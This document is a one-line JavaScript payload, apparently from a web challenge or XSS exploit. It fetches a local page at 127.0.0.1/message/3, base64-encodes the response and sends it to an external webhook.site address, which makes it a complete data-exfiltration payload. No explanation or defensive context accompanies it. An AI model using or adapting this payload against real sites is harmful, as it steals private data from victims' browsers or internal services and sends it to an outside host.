fetch("http://127.0.0.1:80/message/3").then(res => {return res.text()}).then(res=>btoa(res)).then(res => fetch("http://webhook.site/ae5a8c4b-5567-4da6-abbf-cbb4908426fe?true="+res))
